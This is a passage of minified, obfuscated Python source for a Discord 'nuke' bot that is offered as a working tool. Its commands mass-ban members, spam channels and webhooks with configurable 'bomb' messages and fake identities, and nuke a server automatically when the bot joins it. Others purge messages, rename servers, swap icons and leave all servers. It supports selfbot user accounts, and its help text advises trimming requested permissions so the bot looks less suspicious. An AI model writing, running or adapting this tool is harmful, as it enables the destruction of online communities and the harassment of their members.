		if f"{A.name}#{A.discriminator}"in C[n]or K(A.id)in C[n]:L(f"Ban skipped for {A.name}#{A.discriminator} -> in ban whitelist");continue
		T.put((R.put,f"https://discord.com/api/v8/guilds/{B.id}/bans/{A.id}",W,D))
	T.join();L(f"{I.GREEN}Ban all completed.",H)
@G.check(J)
@E.command(name='config')
async def CC(ctx,command=D,*,args=D):
	AR='On bot start status has been set to `{args}`.';AQ='Types';AE='Config is saved';A5='Features';A2='Status';t='Usage';m='(*)Config is not saved';T=command;G=ctx;B=args;global C,AA
	async def w(n,title,array):
		L=array;J=title
		if not n.isdigit()or(n:=P(n)-1)<0:await A(G,Ao);return
		M=k;B=F(L)
		if B==0:return await G.send(f"{J} count: 0")
		C=n*U;E=C+U
		if C>B-U:
			if C>B:await G.send(Ap);return
			E=C+B%U
		else:E=C+U
		for N in i(C,E,1):
			D=L[N]
			if F(D)>17:D=D[:17]+BN
			M+=f"{K(N+1)}) {D}\n"
		Q=h(0,16777215);I=O.Embed(title=J,description=f"Total count: {K(B)}; color: #{p(Q)[2:].zfill(6)}",color=Q);I.add_field(name='Items',value=M,inline=H);I.set_footer(text=f"{n+1}/{K(A4(B/U))}\n"+(AE if o()else m));await G.send(embed=I)
	if T is D:
		M=[];N=[];s=C.copy();N.append(Y)
		if s[Y][y]is D or F(s[Y][d])==0:M.append(e)
		else:M.append(f)
		N.append(Q)
		if F(s[Q][u])==0 or F(s[Q][q])==0 or F(s[Q][v])==0:M.append(e)
		else:M.append(f)
		del s[Y];del s[Q]
		for A1 in s:
			N.append(A1)
			if C[A1]is D or type(C[A1]).__name__==r and F(C[A1])==0:M.append(e)
			else:M.append(f)
		R=h(0,16777215);I=O.Embed(title='Nuking features',description=f":white_check_mark: = Ready to use\n:x: = Needs to config\ncolor: #{p(R)[2:].zfill(6)}",color=R);I.add_field(name=A2,value=b.join(M),inline=H);I.add_field(name=A5,value=b.join(N),inline=H);I.add_field(name=t,value=f"Use `{C[S]}config <feature>` to get more information about how to config that feature.\n\n`{C[S]}config save <file name>` to save the current config. If you save the config as `default.json` the bot next time will directly start with whatever is in that `.json` file.",inline=Z);I.set_footer(text=AE if o()else m);await G.send(embed=I);return
	T=T.lower()
	if T==a or T=='permission'or T=='perms'or T=='perm':
		if B is D:
			M=[];N=[];N.append(a)
			if F(C[a])==0:M.append(e)
			else:M.append(f)
			R=h(0,16777215);I=O.Embed(title='Permissions list',description=f"Permissions for using the bot are given to the users.\n\n:white_check_mark: = Ready to use\n:x: = Needs to config\ncolor: #{p(R)[2:].zfill(6)}",color=R);I.add_field(name=A2,value=b.join(M),inline=H);I.add_field(name=A5,value=b.join(N),inline=H);I.add_field(name=t,value=f"`permissions add <userTag or userID> [userTag or userID] [user...` - grant permissions to the given user(s)\n\n`permissions remove <line number> [line number] [line...` - remove line(s) from the list\n\n`permissions list [page number]` - list all users that are in the permission list",inline=Z);I.set_footer(text=AE if o()else m);await G.send(embed=I)
		else:
			B=B.split()
			def AI(checkingID):
				for A in i(F(C[a])):
					if C[a][A]==checkingID:return H,A
				return Z,D
			if B[0]==z:
				del B[0]
				for AG in B:
					AJ,AK=AI(AG)
					if AJ:await A(G,f"Failed to add `{C[a][AK]}`. Already existed the permission list.");continue
					else:C[a].append(AG)
			elif B[0]==A0:
				if F(B)>1:
					del B[0];J=1;W=F(C[a])
					for L in B:
						if L.isdigit()and 0<=(L:=P(L))-J<=W-J:del C[a][L-J];J+=1
						else:await A(G,f"Skipped deleting line `{L}` -> not an integer between 1 and {K(W)}.")
					await A(G,f"Successfully removed `{K(J-1)}` items.")
				else:await A(G,f"Enter line(s) to remove from bomb_messages fixed list.")
			elif B[0]==r:await w(B[1]if F(B)>1 else V,'permission list',C[a])
			else:await A(G,f"Unknown operation: `{B[1]}`")
	elif T==Y or T=='bomb_message'or T=='bomb':
		if B is D:
			M=[];N=[];N.append(y)
			if C[Y][y]is D:M.append(e)
			else:M.append(f)
			N.append(d)
			if F(C[Y][d])==0:M.append(e)
			else:M.append(f)
			R=h(0,16777215);I=O.Embed(title=Y,description=f'''Config for all the bomb commands.
When you run bomb commands like `{C[S]}channelbomb 100 fixed` the fixed is the type of word list you are going to use. In this case the word list is going to randomly pick texts from the "fixed" list.

:white_check_mark: = Ready to use
:x: = Needs to config
color: #{p(R)[2:].zfill(6)}''',color=R);I.add_field(name=A2,value=b.join(M),inline=H);I.add_field(name=AQ,value=b.join(N),inline=H);I.add_field(name=t,value=f"""`bomb_messages fixed add <command>` - add contents to the back of the list

`bomb_messages fixed remove <line number> [line number] [line...` - remove line(s) from the list

`bomb_messages fixed list [page number]` - list contents that are in the content list

`bomb_messages random <character length>` - sets character length for bomb commands like `{C[S]}kaboom 100 b64`(b64 = base64) """,inline=Z);I.set_footer(text=AE if o()else m);await G.send(embed=I)
		else:
			B=B.split()
			if B[0].lower()==y:
				if F(B)>1 and B[1].isdigit()and 1<=(AH:=P(B[1]))<=1024:C[Y][y]=AH;await A(G,f"Random-message length has been set to `{K(AH)}`.")
				else:await A(G,'Please enter a positive integer that is between 1 and 1024.')
			elif B[0].lower()==d:
				if B[1]==z:
					if F(B)>2 and 1<=F((X:=j.join(B[2:])))<=100:C[Y][d].append(X);await A(G,f"Text added. Character length: `{K(F(X))}`.")
					else:await A(G,f"Please enter something that has 1 to 100 characters.")
				elif B[1]==A0:
					if F(B)>2:
						del B[0],B[0];J=1;W=F(C[Y][d])
						for L in B:
							if L.isdigit()and 0<=(L:=P(L))-J<=W-J:del C[Y][d][L-J];J+=1
							else:await A(G,f"Skipped deleting line `{L}` -> not an integer between 1 and {K(W)}.")
						await A(G,f"Successfully removed `{K(J-1)}` items.")
					else:await A(G,f"Enter line(s) to remove from bomb_messages fixed list.")
				elif B[1]==r:await w(B[2]if F(B)>2 else V,'bomb_messages fixed list',C[Y][d])
				else:await A(G,f"Unknown operation: `{B[1]}`")
			else:await A(G,f"Unable to find {B[0]} config.")
	elif T==Q:
		if B is D:
			M=[];N=[]
			for A1 in C[Q]:
				N.append(A1)
				if F(C[Q][A1])==0:M.append(e)
				else:M.append(f)
			R=h(0,16777215);I=O.Embed(title=Q,description=f"Using webhook to spam messages. To send a message from discord webhook it requires 3 items: usernames, profile picture, and contents. For profile picture you can only put an image URL or put `none` for no pfp.\n\n:white_check_mark: = Ready to use\n:x: = Needs to config\ncolor: #{p(R)[2:].zfill(6)}",color=R);I.add_field(name=A2,value=b.join(M),inline=H);I.add_field(name=AQ,value=b.join(N),inline=H);I.add_field(name=t,value=f"`webhook_spam <type> add <command>` - add contents to the back of the list\n\n`webhook_spam <type> remove <line number> [line number] [line...` - remove line(s) from the list\n\n`webhook_spam <type> list [page number]` - list contents that are in the content list",inline=Z);I.set_footer(text=f"Config is saved"if o()else m);await G.send(embed=I)
		else:
			B=B.split()
			if B[0]==u or B[0]==BV:
				if B[1]==z:
					if F(B)>2 and 0<F((X:=j.join(B[2:])))<=32:C[Q][u].append(X);await A(G,f"Text added. Character length: `{K(F(X))}`.")
					else:await A(G,f"Please enter something that has 1 to 32 characters.")
				elif B[1]==A0:
					if F(B)>2:
						del B[0],B[0];J=1;W=F(C[Q][u])
						for L in B:
							if L.isdigit()and 0<=(L:=P(L))-J<=W-J:del C[Q][u][L-J];J+=1
							else:await A(G,f"Skipped deleting line `{L}` -> not an integer between 1 and {K(W)}.")
						await A(G,f"Successfully removed `{K(J-1)}` items.")
					else:await A(G,f"Enter line(s) to remove from usernames.")
				elif B[1]==r:await w(B[2]if F(B)>2 else V,'webhook_spam usernames list',C[Q][u])
				else:await A(G,f"Unknown operation: `{B[1]}`")
			elif B[0]==q or B[0]=='pfp_url'or B[0]=='pfp':
				if B[1]==z:
					if F(B)>1 and B[2].lower()=='none':C[Q][q].append(D);await A(G,f"No pfp item has been added")
					elif F(B)>1 and(X:=B[2].startswith((Aq,Ar))):C[Q][q].append(X);await A(G,f"URL added.")
					else:await A(G,f"Please enter an **image URL**. Note: the link must start with http(s) protocals. Or enter `none` for no pfp.")
				elif B[1]==A0:
					if F(B)>2:
						del B[0],B[0];J=1;W=F(C[Q][q])
						for L in B:
							if L.isdigit()and 0<=(L:=P(L))-J<=W-J:del C[Q][q][L-J];J+=1
							else:await A(G,f"Skipped deleting line `{L}` -> not an integer between 1 and {K(W)}.")
						await A(G,f"Successfully removed `{K(J-1)}` items.")
					else:await A(G,f"Enter line(s) to remove from pfp_urls.")
				elif B[1]==r:await w(B[2]if F(B)>2 else V,'webhook_spam pfp_urls list',C[Q][q])
				else:await A(G,f"Unknown operation: `{B[1]}`")
			elif B[0]==v or B[0]==BW:
				if B[1]==z:
					if F(B)>1 and 0<F((X:=j.join(B[2:])))<=2000:C[Q][v].append(X);await A(G,f"Text added. Character length: `{K(F(X))}`.")
					else:await A(G,f"Please enter something that has 1 to 2000 characters.")
				elif B[1]==A0:
					if F(B)>2:
						del B[0],B[0];J=1;W=F(C[Q][v])
						for L in B:
							if L.isdigit()and 0<=(L:=P(L))-J<=W-J:del C[Q][v][L-J];J+=1
							else:await A(G,f"Skipped deleting line `{L}` -> not an integer between 1 and {K(W)}.")
						await A(G,f"Successfully removed `{K(J-1)}` items.")
					else:await A(G,f"Enter line(s) to remove from contents.")
				elif B[1]==r:await w(B[2]if F(B)>2 else V,'webhook_spam contents list',C[Q][v])
				else:await A(G,f"Unknown operation: `{B[1]}`")
			else:await A(G,f"Unknown type: `{B[0]}`")
	elif T==c:
		if B is D:
			M=[];N=[];N.append(c)
			if F(C[c])==0:M.append(e)
			else:M.append(f)
			R=h(0,16777215);I=O.Embed(title='After commands',description=f'All the commands in this list will run after `{C[S]}nuke`. It can be disabled by adding "false" after the nuke command: `{C[S]}nuke false`.\n\n:white_check_mark: = Ready to use\n:x: = Needs to config\ncolor: #{p(R)[2:].zfill(6)}',color=R);I.add_field(name=A2,value=b.join(M),inline=H);I.add_field(name=A5,value=b.join(N),inline=H);I.add_field(name=t,value=f"""`after add <command>` - add command to the back of the command list

`after remove <line number> [line number] [line...` - remove line(s) in the command list

`after insert <line number> <command>` - insert command after the given line. Note: use `insert 0 <command>` to insert the command to the first line

`after list [page number]` - list commands that are in the command list""",inline=Z);I.set_footer(text=f"Config is saved"if o()else m);await G.send(embed=I)
		else:
			B=B.split()
			if B[0]==z:
				if F(B)>1:X=j.join(B[1:]);C[c].append(X);await A(G,f"Command added. Character length: `{K(F(X))}`.")
				else:await A(G,f"Please enter the command you want to add after line `{F(C[c])}`.")
			elif B[0]==A0:
				if F(B)>1:
					del B[0];J=1;W=F(C[c])
					for L in B:
						if L.isdigit()and 0<=(L:=P(L))-J<=W-J:del C[c][L-J];J+=1
						else:await A(G,f"Skipped deleting line `{L}` -> not an integer between 1 and {K(W)}.")
					await A(G,f"Successfully removed `{K(J-1)}` items.")
				else:await A(G,f"Enter the line(s) that you want to remove from after commands.")
			elif B[0]=='insert':
				if F(B)>2 and B[1].isdigit():
					if not 0<=(AO:=P(B[1]))<=F(C[c])or F(C[c])==0:await A(G,f"Line `{B[1]}` doesn't exist.");return
					C[c].insert(AO,j.join(B[2:]));await A(G,f"Added command after line `{B[1]}`.")
				else:await A(G,'Insert usage: `after insert <after line #> <command...>`')
			elif B[0]==r:await w(B[1]if F(B)>1 else V,'after command(s) list',C[c])
			else:await A(G,f"Unknown operation: `{B[0]}`")
	elif T==A6:
		if B is D:R=h(0,16777215);I=O.Embed(title=A6,description=f"Whenever the bot boot up the status will be set to a given status.\n\ncolor: #{p(R)[2:].zfill(6)}",color=R);I.add_field(name=A2,value=f"{C[A6]}",inline=H);I.add_field(name=A5,value=A6,inline=H);I.add_field(name=t,value=f"`bot_status <on start status>` - set the on start status. Available on start status are `online`, `offline`, `idle`, and `dnd` or `do_not_disturb`. By default it is set to `offline`.",inline=Z);I.set_footer(text=f"Config is saved"if o()else m);await G.send(embed=I)
		elif(B:=B.lower())in[BX,Aa,BY,Am,BZ]:C[A6]=B;await A(G,AR)
		else:await A(G,'Available on start status are `online`, `offline`, `idle`, and `dnd` or `do_not_disturb`.')
	elif T==x:
		if B is D:R=h(0,16777215);I=O.Embed(title=x,description=f"If you are using a selfbot, then you don't have to do anything to this section. This bot_permission section is for normal bot invite URL that will ask the person inviting it for permission/roles (ex. admin, server manager). The default is set to 2146958847, which asks for all permissions. If you want to make the bot less sus, you can remove the permissions that are not needed.\n\ncolor: #{p(R)[2:].zfill(6)}",color=R);I.add_field(name='Value',value=f"{C[x]}",inline=H);I.add_field(name=A5,value=x,inline=H);I.add_field(name=t,value=f"`bot_permission <value>` - set permissions value to the given number. Use this [permission calculator](https://wizbot.cc/permissions-calculator/?v=0) to help you calculate the values. Note: if you are going to use that calculator all you need is to copy the number that is display at the top, and then use this command.",inline=Z);I.set_footer(text=f"Config is saved"if o()else m);await G.send(embed=I)
		elif B.isdigit()and 0<=P(B)<=2146958847:C[x]=B;await A(G,'Bot permission has been set to `{args}`.')
		else:await A(G,'Please enter a value between 0 and 2146958847.')
	elif T=='save':
		def AP(message):return message.author.id==G.message.author.id
		if B is D:await A(G,f"You need to name the file. Use `{C[S]}save <file name>`.");return
		A8=g.path.join(AT().absolute().__str__(),An);A9=g.path.join(A8,B.translate(Ax))
		if g.path.isfile(A9):
			await A(G,f"Configuration file named {B} already exist. Do you want to overwrite it? [Y/n]")
			while H:
				try:
					A7=(await E.wait_for(BR,check=AP,timeout=10)).content.lower()
					if A7=='y'or A7=='yes':
						with AD(A9,'w')as AC:AC.write(l.dumps(C));break
					elif A7=='n'or A7=='no':await A(G,f"Saving cancelled.");return
					await A(G,f"Yes or no.")
				except (A3.exceptions.TimeoutError,O.ext.commands.errors.CommandInvokeError):await A(G,'Took too long to answer.');return
		else:
			if not g.path.isdir(A8):g.mkdir(A8)
			with AD(A9,'w+')as AC:AC.write(l.dumps(C))
		global AA;AA=Ad(C);await A(G,'Finished saving.')
	elif T==AF:
		if B is D:
			M=[];N=[];N.append('Log response from requests')
			if AB:M.append(f)
			else:M.append(e)
			N.append('Log messages in console')
			if AL:M.append(f)
			else:M.append(e)
			N.append('Log messages in discord chat')
			if AM:M.append(f)
			else:M.append(e)
			N.append('Log any errors')
			if AN:M.append(f)
			else:M.append(e)
			R=h(0,16777215);I=O.Embed(title=AF,description=f"""Verbose is the log level. Meaning that if you don't want any one of the logs to spam rate limiting errors or whatever errors that the bot is going to throw at you, you can disable them to prevent some lag.

Current verbose value: `{K(C[AF])}`
:white_check_mark: = Enabled
:x: = Disabled
color: #{p(R)[2:].zfill(6)}""",color=R);I.add_field(name=A2,value=b.join(M),inline=H);I.add_field(name='Logs',value=b.join(N),inline=H);I.add_field(name=t,value=f'''`verbose <value>` - enable and disable the logs. Subtracting the values below from the current verbose to disable the log(s) you want, and adding the values will enable them. For example if I want to disable "Log any error" I will subtract 8 from 15 to get 7 and use 7 as the new verbose value to set, if I want to disable more like "Log response from request" I will substract 1 from 7 to get 6. To enable them back just add 8 and 1 to the current verbose value.

`1` - Log response from requests
`2` - Log messages in console
`4`- Log messages in discord chat
`8` - Log any errors.''',inline=Z);I.set_footer(text=f"Config is saved"if o()else m);await G.send(embed=I)
		elif B.isdigit()and 0<=(B:=P(B))<=15:C[AF]=B;Ae();await A(G,AR)
		else:await A(G,'You can only enter a positve integer between or on 0 and 15.')
	elif T==n:
		if B is D:
			M=[];N=[];N.append(n)
			if F(C[n])==0:M.append(e)
			else:M.append(f)
			R=h(0,16777215);I=O.Embed(title='Ban whitelist',description=f"Ban whitelist is used for telling `{C[S]}banAll` and `{C[S]}nuke` to not ban the users in the list. You can put discord tag or discord ID in the list, but it is recommended to use discord ID because in the pass there has some uncheckable discord tags.\n\n:white_check_mark: = Ready to use\n:x: = Needs to config\ncolor: #{p(R)[2:].zfill(6)}",color=R);I.add_field(name=A2,value=b.join(M),inline=H);I.add_field(name=A5,value=b.join(N),inline=H);I.add_field(name=t,value=f"`ban_whitelist add <command>` - add user to the back of the command list\n\n`ban_whitelist remove <line number> [line number] [line...` - remove line(s) in the ban whitelist\n\n`ban_whitelist list [page number]` - list users that are in the ban whitelist",inline=Z);I.set_footer(text=f"Config is saved"if o()else m);await G.send(embed=I)
		else:
			B=B.split()
			if B[0]==z:
				if F(B)>1:X=j.join(B[1:]);C[n].append(X);await A(G,f"User added. Character length: `{K(F(X))}`.")
				else:await A(G,f"Please enter the userID or userTag that you want to add after line `{K(F(C[c]))}`.")
			elif B[0]==A0:
				if F(B)>1:
					del B[0];J=1;W=F(C[n])
					for L in B:
						if L.isdigit()and 0<=(L:=P(L))-J<=W-J:del C[n][L-J];J+=1
						else:await A(G,f"Skipped deleting line `{L}` -> not an integer between 1 and {K(W)}.")
					await A(G,f"Successfully removed `{K(J-1)}` items.")
				else:await A(G,f"Enter line(s) to remove from usernames.")
			elif B[0]==r:await w(B[1]if F(B)>1 else V,'ban whitelist',C[n])
			else:await A(G,f"Unknown operation: `{B[0]}`")
	elif T==BJ:await A(G,'This feature has been disable for now due to unhandled slow/bad proxies.')
	elif T=='prefix'or T==S:
		if B is D:await A(G,f"Use `` {command_prefix}config command_prefix <command_prefix> ``")
		else:C[S]=E.command_prefix=B;await A(G,'Command prefix changed.')
	elif T==Al:
		if B is D:await A(G,'Usage: `token <new token>` - new token for this config. Restarting the bot will be required. And remember to save the config before restarting.')
		else:AS=B;await A(G,'New token has been set.')
	else:await A(G,f"Unable to find the config. `{T}`")
@G.check(J)
@E.command(name='checkRolePermissions',aliases=['check','crp'])
async def CD(ctx,name,n=V):
	C=ctx
	if not await N(C):return
	if not n.isdigit()or(n:=P(n)-1)<0:await A(C,Ao);return
	I=X(B.members,AO(name))
	if I is D:await A(C,f"Unable to found {name}.");return
	M=I.guild_permissions.value;Q=BH(I.guild_permissions,key=lambda p:p);F=k;G=31;E=n*U;J=E+U
	if E>G-U:
		if E>G:await C.send(Ap);return
		J=E+G%U
	else:J=E+U
	for R in i(E,J,1):
		S,T=Q[R]
		if T:F+=':white_check_mark: '
		else:F+=':x: '
		F+=S.replace('_',j).capitalize()+b
	try:L=O.Embed(title='User permissions',description=f"Encoded value: {K(M)} : 2147483647",color=O.Color.red());L.add_field(name='Permissions',value=F,inline=H);L.set_footer(text=f"{K(n+1)}/{K(A4(G/U))}");await C.send(embed=L)
	except:await C.send('```diff\n%s %d/%d```'%(F.replace(f,'+').replace(e,'-'),n+1,A4(G/U)))
@G.check(J)
@E.command(name='serverIcon',aliases=['si','changeServerIcon'])
async def CE(ctx,path=D):
	I='Successfully changed server icon.';E=ctx;C=path
	if not await N(E):return
	if C is D:await B.edit(icon=D);await A(E,f"Successfully removed the server icon from `{B.name}`.")
	elif C.startswith((Aq,Ar,BP,BQ)):
		try:await B.edit(icon=A1(R.get(C).content).read());L('Successfully changed the current server icon.')
		except:L(f'Unable to change the server icon to "{C}".')
	elif C[0]=='<':
		C=C.split(':')
		try:
			if C[0]=='<a':await B.edit(icon=O.File(A1(R.get(f"https://cdn.discordapp.com/emojis/{C[2][:-1]}.gif?v=1").content).read()))
			else:await B.edit(icon=A1(R.get(f"https://cdn.discordapp.com/emojis/{C[2][:-1]}.png?v=1").content).read())
			await A(E,I)
		except:raise
	elif g.path.isfile(C):
		with AD(C,'rb')as G:await B.edit(icon=G.read());await A(E,I)
	else:
		try:F=K(ord(C))+', '
		except:F=k
		H=C.encode(AE);w.stdout.buffer.write(f'"{C}" is not supported to be set as a server icon.'.encode(AE));L(F);await A(E,f"{C} is not supported to be set as a server icon.");await A(E,f"Character's bytes: {F}{H}")
@G.check(J)
@E.command(name='serverName',aliases=['sn','changeServerName'])
async def CF(ctx,*,name):
	C=ctx
	if not await N(C):return
	try:await B.edit(name=name);await A(C,f"Server name has been changed to `{name}`.")
	except O.errors.Forbidden:await A(C,'Unable to change server name.');raise
	except:raise
@G.check(J)
@E.command(name='purge',aliases=['clear'])
async def CG(ctx,n=D):
	B=ctx
	if not await N(B):return
	L('Purging messages...',H)
	if n is not D and(not n.isdigit()or(n:=P(n))<1):await A(B,As);return
	F=await B.channel.history(limit=n).flatten();L('Due to discord ratelimitings purging messages cannot be run in a fast pace. After every message the bot will timeout for 3 seconds',H);C=0
	for G in F:
		while H:
			await A3.sleep(C);E=R.delete(f"https://discord.com/api/v8/channels/{B.channel.id}/messages/{G.id}",headers=W)
			if E.status_code==429:C=E.json()[AG];L(f"ratelimiting reached. Purging delay has been set to -> {K(C)} seconds")
			else:break
@G.check(J)
@E.command(name='leave')
async def CH(ctx,name=D):
	F=name;C=ctx
	if F is D:
		if not await N(C):return
		await B.leave()
	else:
		G=X(E.guilds,F)
		if G is D:await A(C,f"Unable to find server {F}.");return
		await G.leave()
	if not A2(C)and C.guild.id==B.id:L(f"{I.BLUE}Goodbye {B.name}! {I.YELLOW}-> {I.GREEN}Left {I.RESET}{B.name}.",H)
	else:await A(C,f"Goodbye {B.name}! -> Left {B.name}.")
@G.check(J)
@E.command(name='leaveAll')
async def CI(ctx):
	await A(ctx,"Leaving all servers. Note: You won't be able to message me after I left all servers.")
	for B in E.guilds:await B.leave()
	L('Left all servers.',H)
@G.check(J)
@E.command(name='joinNuke',aliases=['nukeOnJoin','join nuke'])
async def CJ(ctx,true_or_false):
	C=true_or_false;B=ctx;global AU,AJ
	if C.lower()=='true':AU=B;AJ=H;await A(B,'Nuke on bot joining a new server has been turned on.')
	elif C.lower()=='false':AJ=Z;await A(B,'Nuke on bot joining a new server has been turned off.')
	else:await A(B,'Invalid flag: true or false. Note: true or false is not case sensitive.')
@G.check(J)
@E.command(name='changeStatus',aliases=['cs'])
async def AY(ctx,status):
	A=status
	if A==Aa:await E.change_presence(status=O.Status.offline)
	elif A=='invisible':await E.change_presence(status=O.Status.invisible)
	elif A==BX:await E.change_presence(status=O.Status.online)
	elif A==BY:await E.change_presence(status=O.Status.idle)
	elif A==Am or A==BZ:await E.change_presence(status=O.Status.do_not_disturb)
@G.check(J)
@E.command(name='link',aliases=['l'])
async def CK(ctx):
	if not t:await ctx.channel.send(f"https://discord.com/api/oauth2/authorize?client_id={E.user.id}&permissions={C[x]}&scope=bot")
	else:await A(ctx,f"This account is not a bot :). You can join servers with invite codes.")
@G.check(J)
@E.command(name='autoNick',aliases=[Ab])
async def CL(ctx):
	if not await N(ctx):return
	global A7
	if not A7:
		L(f"{I.CYAN}Auto nickname is on.",H);A7=H
		while A7:await B.me.edit(nick=k.join(AS(Ag,k=10)))
	else:L(f"{I.BLUE}Auto nickname is off.",H);A7=Z
@G.check(J)
@E.command(name='autoStatus',aliases=['as'])
async def CM(ctx):
	global A8
	if not A8:
		L(f"{I.CYAN}Auto status is on.",H);A8=H
		while A8:await E.change_presence(status=O.Status.online);await A3.sleep(Ac()+0.3);await E.change_presence(status=O.Status.offline);await A3.sleep(Ac()+0.3)
	else:L(f"{I.BLUE}Auto status is off.",H);A8=Z
@G.check(J)
@E.command(name='off',aliases=['logout','logoff','shutdown','stop'])
async def CN(ctx):await AY(D,Aa);await E.logout()
from functools import wraps
from asyncio.proactor_events import _ProactorBasePipeTransport as Ai
def BD(func):
	@wraps(func)
	def A(self,*A,**B):
		try:return func(self,*A,**B)
		except RuntimeError as C:
			if K(C)!='Event loop is closed':raise
	return A
Ai.__del__=BD(Ai.__del__)
try:E.run(token,bot=not t)
except O.PrivilegedIntentsRequired:M('PrivilegedIntentsRequired: This field is required to request for a list of members in the discord server that the bot is connected to. Watch https://youtu.be/DXnEFoHwL1A?t=44 to see how to turn on the required field.');exit()
except Ak as BE:M(BE)
finally:w.stdout.write('Exiting...               \n')
